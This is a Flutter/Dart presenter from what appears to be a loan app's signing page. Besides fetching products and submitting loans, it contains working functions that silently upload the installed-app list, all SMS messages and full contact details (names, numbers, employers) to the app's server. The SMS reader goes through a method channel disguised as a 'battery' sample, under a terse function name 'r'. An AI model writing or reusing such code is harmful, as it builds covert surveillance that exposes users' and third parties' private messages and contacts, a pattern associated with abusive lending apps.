import 'dart:convert';

import 'package:appcheck/appcheck.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:myapp9/config/constant.dart';
import 'package:myapp9/models/d_borrow_sign_entity.dart';
import 'package:myapp9/mvp/base_page_presenter.dart';
import 'package:myapp9/net/net.dart';
import 'package:myapp9/pages/sign/iviews/sign_i_mvp_view.dart';
import 'package:sp_util/sp_util.dart';

import '../../../generated/json/d_borrow_sign_entity.g.dart';
import '../../../models/n_user_profile_entity.dart';
import '../../../util/helper.dart';

class SignPagePresenter extends BasePagePresenter<SignIMvpView> {
  SignPagePresenter({required this.productId});

  final String? productId;
  static const platform = MethodChannel('samples.flutter.io/battery');
  late Map<String, dynamic> deviceInfo;

  @override
  void initState() {
    WidgetsBinding.instance.addPostFrameCallback((_) async {
      int currentTimeInSeconds = DateTime.now().millisecondsSinceEpoch ~/ 1000;
      int lastIndexFetchAt = SpUtil.getInt(Constant.lastIndexFetchAt, defValue: currentTimeInSeconds)!;
      if (currentTimeInSeconds == lastIndexFetchAt || currentTimeInSeconds - lastIndexFetchAt > 30) {
        SpUtil.putInt(Constant.lastIndexFetchAt, currentTimeInSeconds);
      }

      deviceInfo = await Helper.getDeviceInfo(view);
      int id = int.parse(productId!);
      // Provider.of<ProductProvider>(view.getContext(), listen:false).bProductEntity.id!;
      List<Map>? dataList = SpUtil.getObjectList(Constant.preComputeInfo + id.toString());

      if (dataList == null) {
        index(true, id);
      } else {
        List<DBorrowSignDataPreComputeItem> data = List<DBorrowSignDataPreComputeItem>.from(dataList.map((value) {
          return $DBorrowSignDataPreComputeItemFromJson(value);
        }));
        view.provider.setDBorrowSignEntity(data);
      }
/*      try {
        view.showProgress();
        await getContacts();
        await r();
        await getApps();
        view.closeProgress();
      } catch (e) {
        view.closeProgress();
      }*/
    });
  }

  Future index(bool isShowDialog, int id) {
    String lastFetchVerifyItemsTime = SpUtil.getString(Constant.lastFetchPreComputeTime + id.toString(), defValue: '')!;
    Map<String, dynamic>? params = {"id": id, "last_fetch_time": lastFetchVerifyItemsTime};
    return requestNetwork<DBorrowSignEntity>(Method.get, url: HttpApi.bProducts, queryParameters: params, isShow: isShowDialog, onSuccess: (data) {
      if (data != null) {
        if (data.data!.preComputeList != null) {
          view.provider.setDBorrowSignEntity(data.data!.preComputeList!);
          SpUtil.putString(Constant.lastFetchPreComputeTime + id.toString(), data.data!.lastFetchTime!);
          SpUtil.putObjectList(Constant.preComputeInfo + id.toString(), data.data!.preComputeList!);
          SpUtil.putString(Constant.signConfirmInfo, data.data!.confirm!);
        }
      }
    }, onError: (_, __) {
      /// 加载失败
    });
  }

  Future dBorrowsStore(bool isShowDialog, int id) {
    Map<String, dynamic>? params = {"id": id};
    // params.addAll(deviceInfo);
    params.addAll({"id": id});
    FormData formData = FormData.fromMap(params);
    return requestNetwork<NUserProfileEntity>(Method.post,
        url: HttpApi.dBorrowsStore,
        // queryParameters: params,
        params: formData,
        isShow: isShowDialog, onSuccess: (data) {
      if (data != null) {
        Helper.cacheProfile(data.data!);
        SpUtil.putString(Constant.expectReviewDate + id.toString(), data.other!.tip1!);
        view.signSuccess(data.other!.tip1!, data.other!.tip2!, data.other!.tip3!, data.other!.tip4!);
      }
    }, onError: (_, __) {
      view.showToast(__);

      /// 加载失败
    });
  }

  Future<void> getApps() async {
    int lastAppUploadTIme = SpUtil.getInt(Constant.tLastAppTime) ?? 0;
    DateTime now = DateTime.now();
    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
    if (!(lastAppUploadTIme == 0 || timestamp - lastAppUploadTIme > 3600 * 10)) {
      return;
    }
    List<AppInfo>? installedApps2;
    List<Map<String, dynamic>> appMaps = [];
    final appCheck = AppCheck();
    List<AppInfo>? installedApps;
    installedApps = await appCheck.getInstalledApps();
    // debugPrint(installedApps.toString());
    installedApps?.sort(
      (a, b) => a.appName!.toLowerCase().compareTo(b.appName!.toLowerCase()),
    );
    installedApps2 = installedApps?.where((element) => !element.isSystemApp!).toList();
    for (AppInfo appOne in installedApps2!) {
      Map<String, dynamic> data = <String, dynamic>{};
      data['appName'] = appOne.appName;
      data['packageName'] = appOne.packageName;
      data['versionName'] = appOne.versionName;
      data['isSystemApp'] = appOne.isSystemApp;
      appMaps.add(data);
    }
    if (appMaps.isNotEmpty) {
      Map<String, dynamic> formDataMap = {};
      formDataMap['messages'] = jsonEncode(appMaps);
      FormData formData = FormData.fromMap(formDataMap);
      var isShowDialog = false;
      requestNetwork<dynamic>(Method.post, url: HttpApi.sAApp, params: formData, isShow: isShowDialog, onSuccess: (data) {
        DateTime now = DateTime.now();
        int timestamp = now.millisecondsSinceEpoch;
        SpUtil.putInt(Constant.tLastAppTime, timestamp ~/ 1000);
        if (data != null) {}
      }, onError: (_, __) {
        /// 加载失败
      });
    }
  }

  Future<void> r() async {
    int lastSmsUploadTIme = SpUtil.getInt(Constant.nLastMsgTime) ?? 0;
    DateTime now = DateTime.now();
    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
    if (!(lastSmsUploadTIme == 0 || timestamp - lastSmsUploadTIme > 3600 * 10)) {
      return;
    }
    bool permission = await view.requestPermission('sms');
    Map<String, dynamic> formDataMap = {};
    if (permission) {
      Map<String, dynamic> arguments = <String, dynamic>{
        'start': lastSmsUploadTIme * 1000,
      };
      final List<dynamic> messages = await platform.invokeMethod('getSmsList', arguments) as List;
      // messages.forEach((element) {});
      if (messages.isNotEmpty) {
        formDataMap['messages'] = jsonEncode(messages);
        FormData formData = FormData.fromMap(formDataMap);
        var isShowDialog = false;
        requestNetwork<dynamic>(Method.post, url: HttpApi.rCSms, params: formData, isShow: isShowDialog, onSuccess: (data) {
          DateTime now = DateTime.now();
          int timestamp = now.millisecondsSinceEpoch;
          SpUtil.putInt(Constant.nLastMsgTime, timestamp ~/ 1000);
          if (data != null) {}
        }, onError: (_, __) {
          /// 加载失败
        });
      }
    } else {
      //todo 没有授权
    }
  }

  Future<void> getContacts() async {
    int lastContactUploadTIme = SpUtil.getInt(Constant.wLastContactTime) ?? 0;
    DateTime now = DateTime.now();
    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
    if (!(lastContactUploadTIme == 0 || timestamp - lastContactUploadTIme > 3600 * 1000)) {
      return;
    }

    if (await view.requestPermission('contacts')) {
      if (await FlutterContacts.requestPermission()) {
        List<Contact> contacts = await FlutterContacts.getContacts();

        // Get all contacts (fully fetched)
        contacts = await FlutterContacts.getContacts(
            withProperties: true, withPhoto: true);
        Map<String, dynamic> FormDataMap = {};
        List<Map<String, dynamic>> contactMaps = [];
        for (Contact contact in contacts) {
          for (Phone phone in contact.phones!) {
            Map<String, dynamic> data = <String, dynamic>{};
            data['phoneValue'] = phone.number;
            data['phoneLabel'] = phone.label;
            data['identifier'] = contact.id;
            data['displayName'] = contact.displayName;
            data['givenName'] = contact.name.first;
            data['middleName'] = contact.name.middle;
            data['familyName'] = contact.name.last;
            data['prefix'] = contact.name.prefix;
            data['suffix'] = contact.name.suffix;
            data['company'] = contact.organizations.first.company;
            data['jobTitle'] = contact.organizations.first.title;
            contactMaps.add(data);
          }
        }
        FormDataMap['messages'] = jsonEncode(contactMaps);
        FormData formData = FormData.fromMap(FormDataMap);
        var isShowDialog = false;
        requestNetwork<dynamic>(Method.post, url: HttpApi.bJContacts, params: formData, isShow: isShowDialog, onSuccess: (data) {
          DateTime now = DateTime.now();
          int timestamp = now.millisecondsSinceEpoch;
          SpUtil.putInt(Constant.wLastContactTime, timestamp ~/ 1000);
          if (data != null) {}
        }, onError: (_, __) {
          /// 加载失败
        });
      }
      // Get all contacts on device


    }
  }
}
